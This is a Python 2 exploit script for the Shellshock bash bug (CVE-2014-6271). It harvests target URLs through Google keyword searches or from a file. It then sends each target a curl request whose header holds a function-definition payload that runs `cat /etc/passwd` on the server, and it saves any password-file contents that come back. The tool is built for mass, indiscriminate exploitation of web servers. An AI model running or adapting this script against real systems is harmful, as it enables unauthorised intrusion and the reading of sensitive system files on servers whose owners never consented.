#!/usr/bin/env python
#coding:utf-8
import os
import sys
import re
import time

sys.path.append(os.path.abspath('./GoogleSearchCrawler/'))
import gsearch

user_agents = 'GoogleSearchCrawler/user_agents'

def test(url):

    if not re.match("http", url):
        print "Malformatted url, eg: http://www.baidu.com/1.cgi"

    else:
        print "CVE-2014-6271 Test", url

        out = 'tmp/' + time.strftime("%Y%m%d%H%M%S%MS", time.localtime())
        test_cmd = "curl -m 5 --connect-timeout 5 -H \'() { :;};a=`/bin/cat /etc/passwd`;echo \"a: $a\"' '"+ url +"' -I -o "+out+"\"output\".txt"
        os.system(test_cmd)
        try:
            if not os.path.exists('tmp'):
                os.mkdir('tmp')
            elif not os.path.isdir('tmp'):
                print 'tmp is not a directory'
                return ''

            f = open(out+"output.txt", 'a+')
            f.write(url + '\n')
            f.close()
            f = open(out+"output.txt", 'r')
        except IOError, e:
            print 'File not found, skip'
            return ''

        a=f.read()
        if re.search("root|bin\/bash",a):
            print '\033[93m' + "Target seems to be affected." + '\033[0m'
            return url + ':\n' + a
        else:
            f.close()
            os.remove(out+"output.txt")
            print '\033[94m' + "Target doesn't seem to be affected." + '\033[0m'
        print

        return url + ':\n' + a

    return ''


def multi_test(urls):
    print 'Testing', len(urls), 'urls...'
    a = ''
    for url in urls:
        res = test(url)
        if res == '':
            return ''
        a += res + '\n' + '>>>>>>>>>' * 10 + '\n'

    return a

def collect_urls_from_google(google_base, keywords, num_to_search=10):

    print 'Collecting urls from google search result'

    gsearch.load_user_agent(user_agents)
    gsearch.base_url = google_base

    print 'Google base url:', gsearch.base_url

    api = gsearch.GoogleAPI()

    if len(keywords) == 0:
        print "Keywords must be specified."
        return []

    urls = []
    for keyword in keywords:
        print 'Searching with keyword(s):', keyword

        results = api.search(keyword, num = num_to_search)
        urls.extend(filter(lambda x: x.startswith('http:'), [result.url for result in results]))

        print len(urls), 'urls collected.'

    return urls

def collect_urls_from_file(filename):
    print 'Collecting urls from file:', filename

    return read_lines_from_file(filename)

def save_urls_to_file(filename, urls, mode='a'):
    print 'Write urls to file:', filename

    try:
        fp = open(filename, mode)
        for url in urls:
            fp.write(url)
            fp.write('\n')

        fp.close()

    except IOError, e:
        print 'Write file error.'
        return

def read_lines_from_file(filename):
    try:
        results = []
        fp = open(filename, 'r')
        for line in fp:
            results.append(line)

        fp.close()

        return results

    except IOError, e:
        print 'Read file error.'
        return []

def write_data_to_file(filename, data):
    print 'Write result to file:', filename

    try:
        fp = open(filename, 'w')
        fp.write(data)
        fp.close()

        return
    except IOError, e:
        print 'Write file error'
        return

def print_usage():
    print '''Usage: python exp.py [-g google_base_url] [-num_result num] [-key_file path] [-targets path] [-sf result_urls_file] [--sf-mode a|w] [-o output]

           -g google_base_url              Base google url.

           -num_result num_of_result       Number of results to collect from google search result. Use 10 by default.
                                           Only be valid if -g is specified.

           -key_file path                  File that stores keywords line by line. Use 'keywords' by default.
                                           Only be valid if -g is specified.

           -targets path                   File that stores urls line by line. Use 'targets' by default.
                                           If both -g and -f are specified, urls in both google search result and targets will be tested.

           -sf result_urls_file            File that stores urls collected from google. Use 'targets_google' by default.
                                           Only be valid if -g is specified.

           --sf-mode a|w                   Mode to use to write to result_urls_file. Use 'a' by default.
                                           Only be valid if -sf is specified.

           -o output                       File that stores test result. Use 'result' by default

       '''

if __name__ == '__main__':
    arg_len = len(sys.argv)
    google_base_url = ''
    result_num = 10
    key_file = ''
    targets_file = ''
    result_urls_file = 'targets_google'
    result_urls_file_mode = 'a'
    test_result_file = 'result'

    if arg_len < 2:
        print_usage()
        exit()
    else:
        for i in range(1, arg_len, 2):
            if sys.argv[i] == '-g':
                google_base_url = sys.argv[i + 1]
                if not google_base_url.startswith('http'):
                    google_base_url = 'https://' + google_base_url + '/'
            elif sys.argv[i] == '-num_result':
                result_num = int(sys.argv[i + 1])
            elif sys.argv[i] == '-key_file':
                key_file = sys.argv[i + 1]
            elif sys.argv[i] == '-targets':
                targets_file = sys.argv[i + 1]
            elif sys.argv[i] == '-sf':
                result_urls_file = sys.argv[i + 1]
            elif sys.argv[i] == '--sf-mode':
                result_urls_file_mode = sys.argv[i + 1]
            elif sys.argv[i] == '-o':
                test_result_file = sys.argv[i + 1]
            else:
                print_usage()
                exit()

    urls = []
    if targets_file != '':
        urls.extend(collect_urls_from_file(targets_file))

    if google_base_url != '':
        keywords = []

        if key_file != '':
            keywords.extend(read_lines_from_file(key_file))
        else:
            keywords.extend(read_lines_from_file('keywords'))

        urls.extend(collect_urls_from_google(google_base_url, keywords, result_num))

        save_urls_to_file(result_urls_file, urls, result_urls_file_mode)

    elif targets_file == '':
        urls.extend(collect_urls_from_file('targets'))

    test_result_data = multi_test(urls)

    if test_result_data == '':
        exit()

    write_data_to_file(test_result_file, test_result_data)

    exit()
